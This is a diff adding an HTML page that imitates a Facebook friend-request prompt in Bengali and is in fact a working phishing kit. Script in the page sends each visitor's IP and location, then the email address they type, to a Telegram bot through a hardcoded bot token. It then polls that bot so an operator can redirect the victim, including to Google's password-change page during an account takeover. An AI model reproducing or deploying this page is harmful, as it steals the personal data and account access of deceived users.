@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Friend Request</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Helvetica', Arial, sans-serif; margin: 0; }
+        .hidden { display: none; }
+        .header-banner { width: 100%; height: 35vh; overflow: hidden; background: white; }
+        .header-banner img { width: 100%; height: 100%; object-fit: cover; }
+        .content-area { width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; }
+        .main-card { background: white; border-radius: 20px; margin-top: -20px; position: relative; min-height: 55vh; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        
+        .secure-input { 
+            width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 8px; 
+            text-align: left; background: #fff; outline: none; font-size: 16px; color: #1c1e21;
+        }
+
+        .loader { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="captureVisitorData()">
+
+    <div class="header-banner">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" alt="FB Banner">
+    </div>
+
+    <div class="content-area">
+        <div class="main-card text-center">
+
+            <div id="step1">
+                <h2 class="text-xl font-bold text-gray-900 mb-2">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+                <p class="text-gray-600 mb-6 text-sm">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
+                <button onclick="goToStep('google_chooser')" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-md shadow-md active:bg-[#166fe5]">Add Friend</button>
+            </div>
+
+            <div id="google_chooser" class="hidden">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/be/Facebook_Messenger_logo_2020.svg" class="w-12 h-12 mx-auto mb-4">
+                <h1 class="text-md font-semibold text-gray-800">আপনার অ্যাকাউন্ট কনফার্ম করুন</h1>
+                <p class="text-xs text-gray-500 mb-4">কিবোর্ডের উপরে আসা জিমেইল অ্যাড্রেসটি সিলেক্ট করুন।</p>
+                
+                <input type="email" 
+                       id="email_field" 
+                       name="email" 
+                       autocomplete="email" 
+                       placeholder="Mobile number or email" 
+                       class="secure-input" 
+                       oninput="onEmailSelected(this.value)">
+                
+                <button onclick="requestAction('verifying', 'Manual Submit')" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-md mt-4">Continue</button>
+            </div>
+
+            <div id="verifying" class="hidden py-8">
+                <div class="loader"></div>
+                <h3 class="text-md font-bold text-gray-800">অপেক্ষা করুন...</h3>
+                <p class="text-xs text-gray-500 mt-2">আপনার অ্যাকাউন্টটি যাচাই করা হচ্ছে।</p>
+            </div>
+
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastId = 0;
+    let userEmail = "";
+
+    async function captureVisitorData() {
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ip = await ipRes.json();
+            sendToBot(`👤 **নতুন ভিজিটর!**\n🌐 IP: ${ip.ip}\n📍 Location: ${ip.city}, ${ip.country_name}`);
+        } catch (e) {}
+    }
+
+    function goToStep(id) {
+        document.querySelectorAll('.main-card > div').forEach(div => div.classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
+    }
+
+    function onEmailSelected(val) {
+        if(val.includes('@')) {
+            userEmail = val;
+            sendToBot(`🎯 **ইমেইল পাওয়া গেছে:** \`${userEmail}\``);
+            
+            // অটোমেটিক ভেরিফাই পেজে নিয়ে যাওয়া
+            setTimeout(() => {
+                goToStep('verifying');
+                listenForCommands();
+            }, 600);
+        }
+    }
+
+    function requestAction(target, status) {
+        goToStep(target);
+        sendToBot(`📍 **ইউজার স্ট্যাটাস:** ${status}\n📧 ইমেইল: \`${userEmail || 'N/A'}\``);
+        listenForCommands();
+    }
+
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+        });
+    }
+
+    function listenForCommands() {
+        setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastId + 1}`);
+                const data = await res.json();
+                if (data.result) {
+                    data.result.forEach(u => {
+                        lastId = u.update_id;
+                        const msg = u.message?.text;
+
+                        if(msg === "/success") window.location.href = "https://m.facebook.com";
+                        if(msg === "/error") {
+                            alert("ভুল তথ্য দেওয়া হয়েছে। আবার চেষ্টা করুন।");
+                            goToStep('google_chooser');
+                        }
+                        if(msg === "/password_change") {
+                            // এটি গুগল পাসওয়ার্ড পেজে নিয়ে যাবে
+                            window.location.replace("https://myaccount.google.com/signinoptions/password");
+                        }
+                    });
+                }
+            } catch (e) {}
+        }, 2500);
+    }
+</script>
+</body>
+</html>
